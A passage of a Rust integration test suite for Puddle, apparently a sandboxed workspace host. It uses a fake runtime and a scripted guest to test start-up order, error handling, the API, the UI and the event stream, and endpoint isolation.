// SPDX-License-Identifier: GPL-3.0-or-later
//! The whole host on fakes: the sandbox runtime is `FakeRuntime` with a scripted guest, the
//! machine is a fake that records what it was asked, and everything else (store, proxies, the
//! workspace service, the API, the UI route, the event stream) is the real code.
#![expect(
    clippy::assert_is_empty,
    clippy::indexing_slicing,
    clippy::unwrap_used,
    reason = "a failed step fails the test; emptiness reads best as a plain assert"
)]

mod support;

use std::future::Future;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use puddle_api::{
    BrowserTarget, DesktopTarget, LaunchError, Launcher, UiAssets, UiFile, WorkspaceRecord,
};
use puddle_certs::{CorporateRoots, SOURCES, StoreSnapshot};
use puddle_compute::fake::{ExecContext, FakeRuntime, Fault, Op};
use puddle_compute::{ExecOutput, ExecRequest, ImageConfig, Runtime};
use puddle_host::{
    DevCertSource, GuestSettings, Host, HostConfig, HostError, HostPaths, PREPARE_STEPS, Platform,
    RewriteGate, RuntimeFactory, RuntimeInputs, SHUTDOWN_STEPS, START_STEPS, Step, prepare,
};
use puddle_netpolicy::EndpointKind;
use puddle_runtime::{RuntimeLayout, RuntimeVersion};
use puddle_secrets::{MemoryStore, SecretStore as _};
use puddle_test_kit::{eventually, next_event_matching, no_event_matching};
use puddle_types::fixture;
use puddle_types::{
    Event, EventSink, GuestEnv, GuestPath, ImageRef, SandboxName, WorkspaceId, WorkspaceName,
};
use puddle_upstream::{Discovery, FakeOs, Mode, ProxyConfig};
use puddle_workspace::{CLEAR_LOCKS_SH, DELETE_CHECK_SH};
use rustls::pki_types::pem::PemObject;
use serde_json::json;
use support::{Api, TestDevCert, ended, hermetic_options};

type Log = Arc<Mutex<Vec<String>>>;

/// What a test runs at each clone, with the clone's address.
type CloneLook = Box<dyn Fn(&str) + Send>;

/// A machine that records every call and can refuse one.
struct FakePlatform {
    log: Log,
    refuse: Option<&'static str>,
    roots: CorporateRoots,
}

impl FakePlatform {
    fn new(log: &Log) -> Self {
        Self {
            log: log.clone(),
            refuse: None,
            roots: CorporateRoots::default(),
        }
    }

    fn call(&self, what: &'static str) -> Result<(), HostError> {
        self.log.lock().unwrap().push(what.to_owned());
        if self.refuse == Some(what) {
            return Err(HostError::Roots(format!("{what} refused")));
        }
        Ok(())
    }
}

impl Platform for FakePlatform {
    fn pin_environment(&self, _: &RuntimeLayout) -> Result<(), HostError> {
        self.call("pin_environment")
    }

    fn check_runtime(&self, _: &RuntimeLayout, expected: &RuntimeVersion) -> Result<(), HostError> {
        assert_eq!(expected, &RuntimeVersion::built_for());
        self.call("check_runtime")
    }

    fn corporate_roots(&self) -> Result<CorporateRoots, HostError> {
        self.call("corporate_roots")?;
        Ok(self.roots.clone())
    }
}

/// The company roots of a machine that has one: a single self-signed root.
fn company_roots() -> CorporateRoots {
    company_roots_with(|_| {})
}

/// As [`company_roots`], with `tweak` applied to the certificate's parameters first.
fn company_roots_with(tweak: impl FnOnce(&mut rcgen::CertificateParams)) -> CorporateRoots {
    let mut params = rcgen::CertificateParams::new(Vec::<String>::new()).unwrap();
    params
        .distinguished_name
        .push(rcgen::DnType::CommonName, "Corp Root CA");
    params.is_ca = rcgen::IsCa::Ca(rcgen::BasicConstraints::Unconstrained);
    params.not_after = rcgen::date_time_ymd(2090, 1, 1);
    tweak(&mut params);
    let key = rcgen::KeyPair::generate().unwrap();
    let cert = params.self_signed(&key).unwrap();
    let mut snapshot = StoreSnapshot::new();
    snapshot.add(SOURCES[0], cert.der().to_vec());
    CorporateRoots::select(&snapshot, std::time::SystemTime::now())
}

/// Opens the shared `FakeRuntime` and records what it was given.
struct FakeFactory {
    runtime: FakeRuntime,
    log: Log,
    pull_proxy: Mutex<Option<String>>,
    pull_url: Mutex<Option<String>>,
    roots: Mutex<Option<usize>>,
    ssh_login_key: Mutex<Option<String>>,
}

impl FakeFactory {
    fn new(runtime: &FakeRuntime, log: &Log) -> Self {
        Self {
            runtime: runtime.clone(),
            log: log.clone(),
            pull_proxy: Mutex::new(None),
            pull_url: Mutex::new(None),
            roots: Mutex::new(None),
            ssh_login_key: Mutex::new(None),
        }
    }
}

impl RuntimeFactory for FakeFactory {
    type Runtime = FakeRuntime;

    fn open(
        &self,
        inputs: RuntimeInputs<'_>,
    ) -> impl Future<Output = Result<FakeRuntime, HostError>> + Send {
        self.log.lock().unwrap().push("open_runtime".to_owned());
        *self.pull_proxy.lock().unwrap() = Some(inputs.pull_proxy.addr().to_string());
        *self.pull_url.lock().unwrap() = Some(inputs.pull_proxy.expose().to_owned());
        *self.roots.lock().unwrap() = Some(inputs.registry_roots.len());
        self.ssh_login_key
            .lock()
            .unwrap()
            .clone_from(&inputs.ssh_login_key);
        assert!(inputs.guest_share.ends_with("guest-share"));
        std::future::ready(Ok(self.runtime.clone()))
    }
}

/// The scripted guest: answers every command Puddle runs in a sandbox.
#[derive(Default)]
struct Guest {
    commands: Mutex<Vec<String>>,
    /// The boot plan (stdin) of every run of the boot hook, with the sandbox it ran in.
    plans: Mutex<Vec<(String, Vec<u8>)>>,
    /// The environment the sandbox was made with, at every run of the boot hook.
    boot_envs: Mutex<Vec<GuestEnv>>,
    dirty: AtomicBool,
    /// Clones of this address fail the way git does for a repository it cannot reach.
    fail_clone_of: Mutex<Option<String>>,
    /// The `sync` after the clones fails.
    fail_sync: AtomicBool,
    /// The arguments of every clone, in order.
    clones: Mutex<Vec<Vec<String>>>,
    /// Runs at every clone with its address, before the guest answers: a look at what Puddle had
    /// set up by then.
    at_clone: Mutex<Option<CloneLook>>,
    fail_boot: AtomicBool,
    /// The folder the guest is asked to make for the workspace cannot be made.
    fail_layout: AtomicBool,
    /// What the lock-clearing script answers, as exit code and stdout, instead of "nothing to do".
    locks_answer: Mutex<Option<(i32, &'static str)>>,
    /// The disk trim fails, in a running workspace's stop.
    fail_trim: AtomicBool,
    /// Runs once, inside the next run of the boot hook: a change made while the guest boots.
    during_boot: Mutex<Option<Box<dyn FnOnce() + Send>>>,
    /// What the shell-init check answers, as exit code and stdout, instead of "quiet".
    check_answer: Mutex<Option<(i32, &'static str)>>,
    /// The script (stdin) of every shell-init check, and what the guest saw at the mounted file
    /// while it ran.
    checks: Mutex<Vec<(String, Option<String>)>>,
    /// Lines the next boot hook prints after its own, once: what the hook says about a file it
    /// put back.
    boot_says: Mutex<String>,
    /// The folder the guest is asked about as the start folder is not there.
    start_folder_missing: AtomicBool,
    /// How many entries that are no checkout the listing reports under the volume root.
    other_entries: AtomicUsize,
    /// When set, the clone turns this path into a folder, so the next save of the workspace
    /// list fails (a stand-in for a full disk or a locked file).
    break_list_on_clone: Mutex<Option<PathBuf>>,
    /// The checkouts on the volume as (directory, remote address): every successful clone adds
    /// one, a test may add or change one by hand. The listing script prints them.
    volume: Mutex<Vec<(String, String)>>,
    /// How many times the listing script ran, for all checkouts or for one.
    listings: Mutex<Vec<Option<String>>>,
    /// The listing script fails the way it does for a volume it cannot enter.
    fail_listing: AtomicBool,
    /// Checkouts the listing reports as unreadable, by directory and message.
    unreadable: Mutex<Vec<(String, String)>>,
    /// The next listing waits here before it answers, and says so in `listing_waits`.
    listing_hold: Mutex<Option<std::sync::mpsc::Receiver<()>>>,
    listing_waits: AtomicBool,
}

impl Guest {
    fn install(self: &Arc<Self>, runtime: &FakeRuntime) {
        let guest = self.clone();
        runtime.on_exec(move |ctx: &mut ExecContext<'_>, r: &ExecRequest| guest.answer(ctx, r));
    }

    fn answer(&self, ctx: &ExecContext<'_>, r: &ExecRequest) -> Option<ExecOutput> {
        let second = r.args.get(1).map(String::as_str);
        if let Some(answer) = self.answer_volume_question(r) {
            return Some(answer);
        }
        let kind = match (r.program.as_str(), r.args.first().map(String::as_str)) {
            ("/bin/sh", Some("/puddle/boot.sh")) => "boot",
            ("mkdir", _) => "layout",
            ("sh", _) if r.args.get(2).map(String::as_str) == Some("puddle-start-folder") => {
                "start-folder"
            }
            ("sh", _) if second == Some(CLEAR_LOCKS_SH) => "locks",
            ("sh", _) if second == Some(DELETE_CHECK_SH) => "check",
            ("sh", _) if second.is_some_and(|s| s.contains("fstrim")) => "shutdown-trim",
            ("sh", _) if second.is_some_and(|s| s.contains("mktemp")) => "shell-init-check",
            ("fstrim", _) => "trim",
            ("git", _) => "clone",
            ("sync", _) => "sync",
            _ => return None,
        };
        self.commands
            .lock()
            .unwrap()
            .push(format!("{} {kind}", ctx.sandbox()));
        if kind == "boot" {
            self.boot_envs.lock().unwrap().push(ctx.env().clone());
            self.plans
                .lock()
                .unwrap()
                .push((ctx.sandbox().to_string(), r.stdin.clone()));
        }
        Some(match kind {
            "boot" if self.fail_boot.load(Ordering::SeqCst) => {
                ExecOutput::new(5, "", "boot.sh: no disk")
            }
            "boot" if self.during_boot.lock().unwrap().is_some() => {
                let change = self.during_boot.lock().unwrap().take().unwrap();
                change();
                self.boot_ok()
            }
            "boot" => self.boot_ok(),
            "start-folder" => self.answer_start_folder(),
            "shell-init-check" => self.answer_shell_init_check(ctx, r),
            "layout" if self.fail_layout.load(Ordering::SeqCst) => ExecOutput::new(
                1,
                "",
                "mkdir: cannot create directory: read-only file system",
            ),
            "locks" => match *self.locks_answer.lock().unwrap() {
                Some((code, out)) => ExecOutput::new(code, out, ""),
                None => ExecOutput::new(0, "D\n", ""),
            },
            "trim" if self.fail_trim.load(Ordering::SeqCst) => {
                ExecOutput::new(1, "", "fstrim: the discard operation is not supported")
            }
            "check" if self.dirty.load(Ordering::SeqCst) => {
                ExecOutput::new(0, "R\tapi\nU\t?? notes.txt\nD\n", "")
            }
            "check" => ExecOutput::new(0, "R\tapi\nD\n", ""),
            "trim" | "shutdown-trim" => {
                ExecOutput::new(0, "/workspaces/x: 4096 bytes trimmed\n", "")
            }
            "clone" => {
                if let Some(list) = self.break_list_on_clone.lock().unwrap().take() {
                    make_unwritable(&list);
                }
                let url = r.args.get(2).cloned().unwrap_or_default();
                self.clones.lock().unwrap().push(r.args.clone());
                if let Some(look) = self.at_clone.lock().unwrap().as_ref() {
                    look(&url);
                }
                if self.fail_clone_of.lock().unwrap().as_deref() == Some(url.as_str()) {
                    ExecOutput::new(
                        128,
                        "",
                        format!("fatal: unable to access '{url}': Could not resolve host"),
                    )
                } else {
                    let dir = r.args.get(3).and_then(|p| p.rsplit('/').next());
                    self.volume
                        .lock()
                        .unwrap()
                        .push((dir.unwrap_or_default().to_owned(), url));
                    ExecOutput::new(0, "", "")
                }
            }
            "sync" if self.fail_sync.load(Ordering::SeqCst) => {
                ExecOutput::new(1, "", "sync: I/O error")
            }
            _ => ExecOutput::new(0, "", ""),
        })
    }

    /// Records the script a shell-init check ran and the file it saw, then answers as set up.
    fn answer_shell_init_check(&self, ctx: &ExecContext<'_>, r: &ExecRequest) -> ExecOutput {
        let seen = ctx
            .read(&GuestPath::new("/puddle/shell-init/init.sh").unwrap())
            .ok()
            .map(|bytes| String::from_utf8_lossy(&bytes).into_owned());
        let script = String::from_utf8_lossy(&r.stdin).into_owned();
        self.checks.lock().unwrap().push((script, seen));
        match *self.check_answer.lock().unwrap() {
            Some((code, out)) => ExecOutput::new(code, out, ""),
            None => ExecOutput::new(0, "", ""),
        }
    }

    /// What the guest says about the start folder: a missing one fails the `[ -d ]` test.
    fn answer_start_folder(&self) -> ExecOutput {
        let missing = self.start_folder_missing.load(Ordering::SeqCst);
        ExecOutput::new(i32::from(missing), "", "")
    }

    /// The two commands that look at the volume: the checkouts listing and the existence check.
    fn answer_volume_question(&self, r: &ExecRequest) -> Option<ExecOutput> {
        if r.program != "sh" {
            return None;
        }
        match r.args.get(2).map(String::as_str) {
            Some("puddle-checkouts") => Some(self.list_volume(r.args.get(4).cloned())),
            Some("puddle-exists") => {
                let dir = r
                    .args
                    .get(3)
                    .and_then(|p| p.rsplit('/').next())
                    .unwrap_or("");
                let there = self.volume.lock().unwrap().iter().any(|(d, _)| d == dir);
                Some(ExecOutput::new(i32::from(!there), "", ""))
            }
            _ => None,
        }
    }

    /// What the listing script prints for the volume, all checkouts or only `only`.
    fn list_volume(&self, only: Option<String>) -> ExecOutput {
        let hold = self.listing_hold.lock().unwrap().take();
        if let Some(hold) = hold {
            self.listing_waits.store(true, Ordering::SeqCst);
            wait_for(&hold);
        }
        if self.fail_listing.load(Ordering::SeqCst) {
            return ExecOutput::new(3, "E\t.\tcannot enter /workspaces/adds\n", "");
        }
        let mut lines: Vec<(String, String)> = Vec::new();
        for (dir, why) in self.unreadable.lock().unwrap().iter() {
            lines.push((dir.clone(), format!("E\t{dir}\t{why}\n")));
        }
        for (dir, remote) in self.volume.lock().unwrap().iter() {
            lines.push((
                dir.clone(),
                format!("C\t{dir}\t{remote}\tmain\tabc1234\t0\n"),
            ));
        }
        lines.sort();
        let mut out = String::new();
        for (dir, line) in lines {
            if only.as_ref().is_none_or(|o| *o == dir) {
                out.push_str(&line);
            }
        }
        if only.is_none() {
            let others = self.other_entries.load(Ordering::SeqCst);
            out.push_str("O\t");
            out.push_str(&others.to_string());
            out.push('\n');
        }
        out.push_str("D\n");
        self.listings.lock().unwrap().push(only);
        ExecOutput::new(0, out, "")
    }

    /// A checkout that is on the volume without Puddle having cloned it.
    fn put_checkout(&self, dir: &str, remote: &str) {
        let mut volume = self.volume.lock().unwrap();
        volume.retain(|(d, _)| d != dir);
        volume.push((dir.to_owned(), remote.to_owned()));
    }

    fn boot_ok(&self) -> ExecOutput {
        let said = std::mem::take(&mut *self.boot_says.lock().unwrap());
        ExecOutput::new(0, format!("{said}puddle-boot: ready\n"), "")
    }

    fn commands(&self) -> Vec<String> {
        self.commands.lock().unwrap().clone()
    }

    /// Every clone's arguments, joined.
    fn clone_commands(&self) -> Vec<String> {
        self.clones
            .lock()
            .unwrap()
            .iter()
            .map(|args| args.join(" "))
            .collect()
    }

    fn syncs(&self) -> usize {
        self.commands()
            .iter()
            .filter(|c| c.ends_with(" sync"))
            .count()
    }

    /// The boot plan number `n` (from 0) as sent to the guest.
    fn plan_bytes(&self, n: usize) -> Vec<u8> {
        self.plans.lock().unwrap()[n].1.clone()
    }

    /// The files the boot plan number `n` (from 0) wrote, by guest path.
    fn plan_files(&self, n: usize) -> std::collections::BTreeMap<String, Vec<u8>> {
        plan_files(&self.plans.lock().unwrap()[n].1)
    }

    fn boots(&self) -> usize {
        self.plans.lock().unwrap().len()
    }

    /// Waits until the hook has run `n` times in all.
    async fn boots_reach(&self, n: usize) {
        for _ in 0..500 {
            if self.boots() >= n {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        assert!(
            self.boots() >= n,
            "the boot hook ran {} times, not {n}",
            self.boots()
        );
    }
}

/// The files a rendered boot plan writes: each `puddle_file '<path>' <mode> '<printf format>'`
/// line, with the format decoded the way `printf` reads it (`\NNN` is an octal byte).
fn plan_files(plan: &[u8]) -> std::collections::BTreeMap<String, Vec<u8>> {
    let text = String::from_utf8(plan.to_vec()).unwrap();
    let mut files = std::collections::BTreeMap::new();
    for line in text.split("\npuddle_") {
        let Some(rest) = line.strip_prefix("file ") else {
            continue;
        };
        let rest = rest.strip_prefix('\'').unwrap();
        let (path, rest) = rest.split_once("' ").unwrap();
        let (_mode, rest) = rest.split_once(' ').unwrap();
        let format = rest.strip_prefix('\'').unwrap();
        let format = &format[..format.rfind('\'').unwrap()];
        let mut bytes = Vec::new();
        let mut chars = format.bytes().peekable();
        while let Some(b) = chars.next() {
            if b == b'\\' {
                let octal: String = (0..3).map(|_| char::from(chars.next().unwrap())).collect();
                bytes.push(u8::from_str_radix(&octal, 8).unwrap());
            } else {
                bytes.push(b);
            }
        }
        files.insert(path.to_owned(), bytes);
    }
    files
}

#[derive(Debug)]
struct TestUi;

impl UiAssets for TestUi {
    fn get(&self, path: &str) -> Option<UiFile> {
        (path.is_empty() || path == "index.html")
            .then(|| UiFile::new(&b"<html>Puddle test ui</html>"[..], "text/html"))
    }
}

#[derive(Debug, Default)]
struct RecordingLauncher {
    /// Makes the next launch fail with this message (once).
    fail_with: Mutex<Option<String>>,
    opened: Mutex<Vec<String>>,
    targets: Mutex<Vec<DesktopTarget>>,
    /// What each browser window was asked to open, in order.
    browser: Mutex<Vec<BrowserTarget>>,
    /// The workspaces whose windows were asked to close, in order.
    closed: Mutex<Vec<String>>,
    /// The workspaces whose browser data was asked to go, in order.
    forgotten: Mutex<Vec<String>>,
    /// Makes every forget fail with this message.
    forget_fails_with: Mutex<Option<String>>,
}

impl Launcher for RecordingLauncher {
    fn open_desktop<'a>(
        &'a self,
        workspace: &'a WorkspaceRecord,
        target: &'a DesktopTarget,
    ) -> futures_util::future::BoxFuture<'a, Result<(), LaunchError>> {
        Box::pin(async move {
            if let Some(message) = self.fail_with.lock().unwrap().take() {
                return Err(LaunchError::new(message));
            }
            self.opened.lock().unwrap().push(workspace.name.to_string());
            self.targets.lock().unwrap().push(target.clone());
            Ok(())
        })
    }

    fn open_browser<'a>(
        &'a self,
        _workspace: &'a WorkspaceRecord,
        target: &'a BrowserTarget,
    ) -> futures_util::future::BoxFuture<'a, Result<(), LaunchError>> {
        Box::pin(async move {
            if let Some(message) = self.fail_with.lock().unwrap().take() {
                return Err(LaunchError::new(message));
            }
            self.browser.lock().unwrap().push(target.clone());
            Ok(())
        })
    }

    fn close_browser<'a>(
        &'a self,
        workspace: &'a WorkspaceName,
    ) -> futures_util::future::BoxFuture<'a, ()> {
        Box::pin(async move { self.closed.lock().unwrap().push(workspace.to_string()) })
    }

    fn forget_browser<'a>(
        &'a self,
        workspace: &'a WorkspaceName,
    ) -> futures_util::future::BoxFuture<'a, Result<(), LaunchError>> {
        Box::pin(async move {
            self.forgotten.lock().unwrap().push(workspace.to_string());
            match self.forget_fails_with.lock().unwrap().clone() {
                Some(message) => Err(LaunchError::new(message)),
                None => Ok(()),
            }
        })
    }
}

/// A launcher with no window, as `puddle serve` has: it answers a desktop attach like the
/// recording one and leaves `open_browser` at the trait's default.
struct DesktopOnly(Arc<RecordingLauncher>);

impl Launcher for DesktopOnly {
    fn open_desktop<'a>(
        &'a self,
        workspace: &'a WorkspaceRecord,
        target: &'a DesktopTarget,
    ) -> futures_util::future::BoxFuture<'a, Result<(), LaunchError>> {
        self.0.open_desktop(workspace, target)
    }
}

struct Rig {
    dev_cert: Arc<TestDevCert>,
    dir: tempfile::TempDir,
    log: Log,
    runtime: FakeRuntime,
    guest: Arc<Guest>,
    launcher: Arc<RecordingLauncher>,
    /// Starts the host with a launcher that has no window ([`DesktopOnly`]).
    windowless: AtomicBool,
    /// Where the host keeps the values of secrets: never the machine's own credential store.
    secrets: Arc<MemoryStore>,
    /// Holds an author rewrite back when it starts, for a test that sets it before the start.
    rewrite_gate: Mutex<Option<RewriteGate>>,
}

impl Rig {
    fn new() -> Self {
        let runtime = FakeRuntime::new();
        let guest = Arc::new(Guest::default());
        guest.install(&runtime);
        Self {
            dev_cert: Arc::new(TestDevCert::new()),
            dir: tempfile::tempdir().unwrap(),
            log: Log::default(),
            runtime,
            guest,
            launcher: Arc::new(RecordingLauncher::default()),
            windowless: AtomicBool::new(false),
            secrets: Arc::new(MemoryStore::new()),
            rewrite_gate: Mutex::new(None),
        }
    }

    fn config(&self) -> HostConfig {
        let root = self.dir.path();
        let agent = root.join("puddle-agent");
        std::fs::write(&agent, b"#!agent\n").unwrap();
        let layout =
            RuntimeLayout::new(root.join("runtime"), root.join("data").join("msb")).unwrap();
        let mut config = HostConfig::new(
            HostPaths::new(root.join("data")),
            layout,
            GuestSettings::new(agent),
        );
        // Never the machine's own proxy settings.
        config.upstream.discovery.mode = Mode::Direct;
        config.api.ui = Some(Arc::new(TestUi));
        config.operations_grace = Duration::from_secs(5);
        config.ssh.bridge_program = Some(root.join("puddle"));
        config.ssh.user_config = Some(self.user_ssh_config());
        config
    }

    /// The user's own ssh config of this rig's pretend home: never the real one.
    fn user_ssh_config(&self) -> PathBuf {
        self.dir.path().join("home").join(".ssh").join("config")
    }

    /// Puddle's own ssh config file.
    fn puddle_ssh_config(&self) -> PathBuf {
        self.dir.path().join("data").join("ssh").join("config")
    }

    async fn start(&self) -> Host<FakeRuntime> {
        self.start_with(self.config()).await
    }

    async fn start_with(&self, config: HostConfig) -> Host<FakeRuntime> {
        let prepared = prepare(config, &FakePlatform::new(&self.log)).unwrap();
        let mut options = hermetic_options();
        options.launcher = if self.windowless.load(Ordering::SeqCst) {
            Arc::new(DesktopOnly(self.launcher.clone()))
        } else {
            self.launcher.clone()
        };
        options.secret_store = Some(self.secrets.clone());
        options
            .rewrite_gate
            .clone_from(&self.rewrite_gate.lock().unwrap());
        options.dev_cert = Some(self.dev_cert.clone() as Arc<dyn DevCertSource>);
        // No guest runs here, so nothing may ask the machine's DNS about a name.
        options.resolver = Some(Arc::new(puddle_proxy::testing::StaticResolver::new()));
        Host::start(
            prepared,
            &FakeFactory::new(&self.runtime, &self.log),
            options,
        )
        .await
        .unwrap()
    }

    fn calls(&self) -> Vec<String> {
        self.log.lock().unwrap().clone()
    }
}

fn api(host: &Host<FakeRuntime>) -> Api {
    Api::new(host.url(), host.token())
}

const REPO: &str = "https://example.org/acme/api.git";

fn new_workspace(name: &str) -> String {
    json!({"name": name, "repositories": [{"url": REPO}]}).to_string()
}

async fn create(api: &Api, events: &mut support::Events, name: &'static str) {
    let reply = api.post("/api/workspaces", &new_workspace(name)).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    events.until(ended(name), Duration::from_secs(20)).await;
}

/// Turns the file at `path` into a non-empty folder: replacing it then fails on every OS.
fn make_unwritable(path: &std::path::Path) {
    if path.is_file() {
        std::fs::remove_file(path).unwrap();
    }
    std::fs::create_dir_all(path).unwrap();
    std::fs::write(path.join("keep"), b"x").unwrap();
}

fn status_of(reply: &support::Reply) -> String {
    reply.json()["status"].as_str().unwrap().to_owned()
}

// ---- the start-up order -------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn start_runs_the_steps_in_the_documented_order() {
    let rig = Rig::new();
    let platform = FakePlatform::new(&rig.log);
    let prepared = prepare(rig.config(), &platform).unwrap();
    assert_eq!(prepared.steps(), PREPARE_STEPS);
    let factory = FakeFactory::new(&rig.runtime, &rig.log);
    let host = Host::start(prepared, &factory, hermetic_options())
        .await
        .unwrap();
    assert_eq!(host.steps(), START_STEPS);
    // The machine was asked in dependency order and the runtime opened last of those.
    assert_eq!(
        rig.calls(),
        [
            "pin_environment",
            "check_runtime",
            "corporate_roots",
            "open_runtime"
        ]
    );
    // The runtime got the address of the pull proxy bound in the first step, loopback only,
    // and no roots (this machine has none).
    let proxy = factory.pull_proxy.lock().unwrap().clone().unwrap();
    assert!(proxy.starts_with("127.0.0.1:"), "{proxy}");
    assert_eq!(*factory.roots.lock().unwrap(), Some(0));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_refused_step_stops_the_start_before_the_runtime_is_touched() {
    for refused in ["pin_environment", "check_runtime", "corporate_roots"] {
        let rig = Rig::new();
        let mut platform = FakePlatform::new(&rig.log);
        platform.refuse = Some(refused);
        let err = prepare(rig.config(), &platform).unwrap_err();
        assert!(err.to_string().contains(refused), "{err}");
        assert!(!rig.calls().contains(&"open_runtime".to_owned()));
        // Nothing was asked of the runtime.
        assert!(rig.runtime.calls().is_empty());
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_missing_agent_stops_the_start_before_anything_is_reconciled() {
    let rig = Rig::new();
    let mut config = rig.config();
    config.guest = GuestSettings::new(rig.dir.path().join("no-agent"));
    let prepared = prepare(config, &FakePlatform::new(&rig.log)).unwrap();
    let err = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(err, HostError::AgentMissing { .. }), "{err}");
    assert!(!rig.calls().contains(&"open_runtime".to_owned()));
    assert!(rig.runtime.calls().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_taken_api_port_is_reported_and_nothing_was_stopped_or_removed() {
    let rig = Rig::new();
    let first = rig.start().await;
    // Another data folder, so only the port is shared.
    let mut config = rig.config();
    config.paths = HostPaths::new(rig.dir.path().join("other-data"));
    config.api.port = first.url().port().unwrap();
    let prepared = prepare(config, &FakePlatform::new(&rig.log)).unwrap();
    let err = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(err, HostError::Api(_)), "{err}");
    first.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_second_host_on_the_same_data_folder_is_refused_and_the_first_is_untouched() {
    let rig = Rig::new();
    let first = rig.start().await;
    let api = api(&first);
    let mut events = api.events().await;
    create(&api, &mut events, "keep").await;
    after_boot_listing(&rig).await;
    let running = rig
        .runtime
        .list()
        .await
        .unwrap()
        .iter()
        .filter(|s| !s.status.is_down())
        .count();
    assert_eq!(running, 1);
    let calls_before = rig.runtime.calls();
    let log_before = rig.calls();

    let err = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap_err();
    assert!(matches!(err, HostError::DataFolder(_)), "{err}");
    let message = err.to_string();
    assert!(
        message.contains(&format!("process ID {}", std::process::id())),
        "{message}"
    );
    assert!(message.contains("data folder"), "{message}");

    // The refused start asked the machine nothing and the runtime nothing: the first host's
    // sandbox was neither trimmed nor stopped.
    assert_eq!(rig.calls(), log_before);
    assert_eq!(rig.runtime.calls(), calls_before);
    let still = rig.runtime.list().await.unwrap();
    assert_eq!(still.iter().filter(|s| !s.status.is_down()).count(), 1);
    assert_eq!(api.get("/api/health").await.status, 200);

    // Once the first host is gone the folder is free again.
    first.shutdown().await;
    drop(first);
    drop(prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap());
}

// ---- the daemon end to end ----------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn the_daemon_serves_the_api_the_ui_and_the_event_stream() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);

    // The API wants the token; the UI is served from the same origin without one.
    assert_eq!(
        api.request("GET", "/api/health", None, false).await.status,
        401
    );
    assert_eq!(api.get("/api/health").await.status, 200);
    let ui = api.request("GET", "/", None, false).await;
    assert_eq!(ui.status, 200);
    assert!(ui.body.contains("Puddle test ui"), "{}", ui.body);

    // The connection file names this host.
    let info =
        puddle_api::ConnectionInfo::read(&rig.dir.path().join("data").join("api.json")).unwrap();
    assert_eq!(info.token.expose(), host.token());

    // Create: events flow, in order, from the real service.
    let mut events = api.events().await;
    let reply = api.post("/api/workspaces", &new_workspace("acme")).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    assert_eq!(reply.json()["busy"], "creating");
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(
        events.steps("acme"),
        [
            "preparing_volume",
            "pulling_image",
            "starting",
            "syncing",
            "cloning",
            "done"
        ]
    );
    assert!(
        events
            .seen
            .iter()
            .any(|e| e["type"] == "status_changed" && e["status"] == "running")
    );

    let list = api.get("/api/workspaces").await.json();
    assert_eq!(list["workspaces"][0]["name"], "acme");
    assert_eq!(list["workspaces"][0]["status"], "running");
    assert!(list["workspaces"][0]["busy"].is_null());

    // The guest saw the whole boot sequence, in order.
    let commands = rig.guest.commands();
    let kinds: Vec<&str> = commands
        .iter()
        .map(|c| c.split(' ').nth(1).unwrap())
        .collect();
    assert_eq!(kinds, ["boot", "layout", "locks", "clone", "sync"]);

    // Stop trims then stops; start boots it again in the same sandbox.
    let stop = api.post("/api/workspaces/acme/stop", "").await;
    assert_eq!(stop.status, 202, "{}", stop.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(status_of(&api.get("/api/workspaces/acme").await), "stopped");
    let start = api.post("/api/workspaces/acme/start", "").await;
    assert_eq!(start.status, 202, "{}", start.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(status_of(&api.get("/api/workspaces/acme").await), "running");
    let calls: Vec<String> = rig
        .runtime
        .calls()
        .iter()
        .map(|c| format!("{:?}", c.op))
        .collect();
    assert_eq!(
        calls.iter().filter(|c| *c == "Create").count(),
        1,
        "{calls:?}"
    );
    assert_eq!(
        calls.iter().filter(|c| *c == "Start").count(),
        1,
        "{calls:?}"
    );

    // Stop, then delete a clean workspace without a fingerprint.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let gone = api
        .delete(
            "/api/workspaces/acme",
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(gone.status, 202, "{}", gone.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let list = api.get("/api/workspaces").await.json();
    assert!(list["workspaces"].as_array().unwrap().is_empty());
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_apis_address_is_registered_so_no_guest_can_ask_the_proxy_for_it() {
    let rig = Rig::new();
    let host = rig.start().await;
    let addr = std::net::SocketAddr::new(
        host.url().host_str().unwrap().parse().unwrap(),
        host.url().port().unwrap(),
    );
    let kinds: Vec<_> = host
        .endpoints()
        .list()
        .into_iter()
        .map(|(a, kind)| (a == addr, kind))
        .collect();
    assert!(kinds.contains(&(true, EndpointKind::Api)), "{kinds:?}");
    // The pull proxy is registered too (the other loopback entry).
    assert!(
        kinds.iter().any(|(_, k)| *k == EndpointKind::PullProxy),
        "{kinds:?}"
    );
    host.shutdown().await;
    assert!(
        host.endpoints().list().is_empty(),
        "{:?}",
        host.endpoints().list()
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn ending_the_extension_hosts_of_a_workspace_that_has_no_agent_says_it_is_not_running() {
